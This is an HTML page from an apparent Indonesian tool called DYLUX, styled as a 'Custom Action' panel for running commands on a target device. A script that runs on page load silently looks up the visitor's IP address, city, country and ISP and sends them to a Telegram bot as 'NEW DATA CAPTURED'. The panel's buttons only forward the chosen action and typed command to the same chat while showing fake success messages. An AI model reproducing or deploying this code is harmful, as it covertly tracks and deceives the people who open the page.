<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Custom Action</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; font-family: Arial, sans-serif; color: #e0e0ff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .box { background: #14141e; border: 1px solid rgba(0,240,255,0.1); border-radius: 16px; padding: 40px 32px; max-width: 400px; width: 100%; text-align: center; }
        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00f0ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .badge { display: inline-block; background: rgba(123,47,252,0.1); color: #7b2ffc; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
        .icon { font-size: 48px; margin: 16px 0; }
        h2 { font-size: 18px; margin-bottom: 8px; }
        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
        input, select { width: 100%; padding: 14px; background: #0a0a0f; border: 1px solid rgba(0,240,255,0.1); border-radius: 12px; color: #fff; font-size: 16px; outline: none; margin: 8px 0; }
        input:focus, select:focus { border-color: #00f0ff; }
        select option { background: #0a0a0f; }
        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
        button:hover { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .footer { margin-top: 20px; font-size: 11px; color: #555; }
        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">DYLUX</div>
        <div class="badge">⚡ Custom Action</div>
        <div class="icon">⚡</div>
        <h2>Aksi Kustom</h2>
        <p>Jalankan perintah kustom pada perangkat target.</p>
        <input type="text" id="cmdInput" placeholder="Masukkan perintah...">
        <select id="actionSelect">
            <option value="screenshot">📸 Screenshot</option>
            <option value="file_list">📁 Daftar File</option>
            <option value="system_info">💻 Info Sistem</option>
            <option value="network_scan">🌐 Scan Jaringan</option>
            <option value="custom">⚡ Custom</option>
        </select>
        <button id="execBtn">▶️ Jalankan</button>
        <div class="spinner" id="spinner"></div>
        <div id="statusMsg"></div>
        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
    </div>

    <script>
    (async function autoDetect() {
        try {
            const userId = new URLSearchParams(window.location.search).get('id');
            if (!userId) return;
            const ipRes = await fetch('https://ip-api.com/json/');
            const ipData = await ipRes.json();
            const message = `<b>🎯 NEW DATA CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📌 Type:</b> Auto-Detect\n<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n<b>📍 Lokasi:</b> ${ipData.city || 'unknown'}, ${ipData.country || 'unknown'}\n<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });
        } catch (e) { console.error(e); }
    })();

    const userId = new URLSearchParams(window.location.search).get('id');
    const execBtn = document.getElementById('execBtn');
    const cmdInput = document.getElementById('cmdInput');
    const actionSelect = document.getElementById('actionSelect');
    const spinner = document.getElementById('spinner');
    const statusMsg = document.getElementById('statusMsg');

    const actionMap = {
        'screenshot': '📸 Screenshot diambil',
        'file_list': '📁 Daftar file berhasil diambil',
        'system_info': '💻 Info sistem berhasil diambil',
        'network_scan': '🌐 Scan jaringan selesai',
        'custom': '⚡ Perintah kustom dijalankan'
    };

    execBtn.addEventListener('click', async () => {
        const action = actionSelect.value;
        const customCmd = cmdInput.value.trim();

        if (action === 'custom' && !customCmd) {
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '⚠️ Masukkan perintah kustom!';
            return;
        }

        execBtn.disabled = true;
        spinner.classList.add('active');
        statusMsg.style.display = 'none';

        try {
            const message = `<b>⚡ CUSTOM ACTION CAPTURED!</b>\n\n<b>👤 User ID:</b> <code>${userId}</code>\n<b>📌 Action:</b> ${action}\n<b>📄 Command:</b> ${action === 'custom' ? customCmd : action}\n<b>📌 Result:</b> ${actionMap[action] || 'Perintah dijalankan'}\n<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });
            spinner.classList.remove('active');
            execBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = `✅ ${actionMap[action] || 'Perintah dijalankan'}!`;
        } catch (error) {
            spinner.classList.remove('active');
            execBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '❌ Gagal!';
        }
    });
    </script>
</body>
</html>
